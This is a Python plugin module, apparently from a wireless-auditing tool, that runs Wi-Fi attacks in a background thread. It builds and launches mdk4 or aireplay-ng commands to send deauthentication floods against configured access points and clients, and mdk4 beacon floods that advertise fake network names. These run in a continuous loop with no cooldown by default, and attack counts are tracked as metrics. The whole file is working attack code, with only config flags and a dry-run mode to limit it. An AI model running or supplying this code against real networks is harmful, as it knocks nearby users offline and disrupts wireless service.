from __future__ import annotations

import os
import platform
import subprocess
import tempfile
import threading
import time
from pathlib import Path

priority = 120

_RUN = False
_PROC: subprocess.Popen[bytes] | None = None
_METRICS = {
    "momo_attack_deauth_runs_total": 0,
    "momo_attack_deauth_failures_total": 0,
    "momo_attack_beacon_runs_total": 0,
    "momo_attack_beacon_failures_total": 0,
    "momo_attack_last_rc": 0,
    "momo_attack_active": 0,
}


def _is_linux() -> bool:
    return os.name != "nt" and platform.system() == "Linux"


def _cmd_exists(bin_name: str) -> bool:
    import shutil

    return bool(shutil.which(bin_name))


def _maybe_start(cmd: list[str], max_secs: int) -> int:
    global _PROC
    try:
        _METRICS["momo_attack_active"] = 1
        _PROC = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        t0 = time.time()
        while time.time() - t0 < max_secs:
            if _PROC.poll() is not None:
                break
            time.sleep(0.2)
        if _PROC and _PROC.poll() is None:
            _PROC.terminate()
            try:
                _PROC.wait(timeout=3)
            except Exception:
                _PROC.kill()
        rc = 0 if _PROC is None else (_PROC.returncode or 0)
        _METRICS["momo_attack_last_rc"] = rc
        return rc
    finally:
        _PROC = None
        _METRICS["momo_attack_active"] = 0


def _build_deauth_cmd(tool: str, iface: str, bssid: str, client: str | None, pps: int) -> list[str]:
    if tool == "mdk4":
        # mdk4 <iface> d -t <BSSID> [-c <client>] -s <pps>
        cmd = ["mdk4", iface, "d", "-t", bssid, "-s", str(max(1, pps))]
        if client:
            cmd += ["-c", client]
        return cmd
    # aireplay-ng fallback: aireplay-ng --deauth 0 -a <BSSID> [-c <client>] <iface>
    cmd = ["aireplay-ng", "--deauth", "10", "-a", bssid]
    if client:
        cmd += ["-c", client]
    cmd.append(iface)
    return cmd


def _build_beacon_cmd(iface: str, ssids: list[str], pps: int) -> tuple[list[str], Path | None]:
    if not ssids:
        return [], None
    tmp = Path(tempfile.mkstemp(prefix="momo_beacon_", suffix=".txt")[1])
    tmp.write_text("\n".join(ssids), encoding="utf-8")
    # mdk4 <iface> b -s <file> -m <pps>
    return ["mdk4", iface, "b", "-s", str(tmp), "-m", str(max(1, pps))], tmp


def init(cfg: dict) -> None:
    global _RUN
    _RUN = True

    def worker() -> None:
        try:
            _run(cfg)
        except Exception:
            pass

    threading.Thread(target=worker, daemon=True).start()


def _run(cfg: dict) -> None:
    # Resolve global config if provided by registry
    g = cfg.get("_global")
    aggressive_enabled = bool(getattr(getattr(g, "aggressive", None), "enabled", False)) if g else False
    iface = cfg.get("iface") or (getattr(getattr(g, "interface", None), "name", None) if g else None) or "wlan0"
    channels = cfg.get("channels") or []
    bssids: list[str] = cfg.get("bssid_whitelist") or []
    clients: list[str] = cfg.get("deauth_clients") or []
    ssids: list[str] = cfg.get("beacon_ssids") or []
    pps = int(cfg.get("pkts_per_second", 50))
    max_secs = int(cfg.get("max_runtime_secs", 20))
    cooldown = int(cfg.get("cooldown_secs", 0))  # 0 = no cooldown by default
    tool = str(cfg.get("tool", "auto"))
    dry = os.environ.get("MOMO_DRY_RUN") == "1" or os.name == "nt"

    if not (_is_linux() and aggressive_enabled and bool(cfg.get("enabled", False))):
        return

    # choose tool
    chosen = "mdk4" if tool in ("mdk4", "auto") and _cmd_exists("mdk4") else None
    if chosen is None and tool in ("aireplay-ng", "auto") and _cmd_exists("aireplay-ng"):
        chosen = "aireplay-ng"
    if chosen is None:
        return

    while _RUN:
        # deauth by BSSID list
        if bssids:
            for bssid in bssids:
                if not _RUN:
                    break
                if dry:
                    _METRICS["momo_attack_deauth_runs_total"] += 1
                    continue
                cmd = _build_deauth_cmd(chosen, iface, bssid, (clients[0] if clients else None), pps)
                rc = _maybe_start(cmd, max_secs)
                if rc == 0:
                    _METRICS["momo_attack_deauth_runs_total"] += 1
                else:
                    _METRICS["momo_attack_deauth_failures_total"] += 1
                if cooldown > 0:
                    time.sleep(cooldown)

        # beacon flood if ssids provided and mdk4 exists
        if ssids and _cmd_exists("mdk4"):
            if dry:
                _METRICS["momo_attack_beacon_runs_total"] += 1
            else:
                cmd, tmp = _build_beacon_cmd(iface, ssids, pps)
                try:
                    if cmd:
                        rc = _maybe_start(cmd, max_secs)
                        if rc == 0:
                            _METRICS["momo_attack_beacon_runs_total"] += 1
                        else:
                            _METRICS["momo_attack_beacon_failures_total"] += 1
                finally:
                    try:
                        if tmp:
                            tmp.unlink(missing_ok=True)
                    except Exception:
                        pass
            if cooldown > 0:
                time.sleep(cooldown)

        # break loop if neither configured
        if not bssids and not ssids:
            break


def shutdown() -> None:
    global _RUN, _PROC
    _RUN = False
    try:
        if _PROC and _PROC.poll() is None:
            _PROC.terminate()
            try:
                _PROC.wait(timeout=3)
            except Exception:
                _PROC.kill()
    except Exception:
        pass


def get_metrics() -> dict:
    return dict(_METRICS)


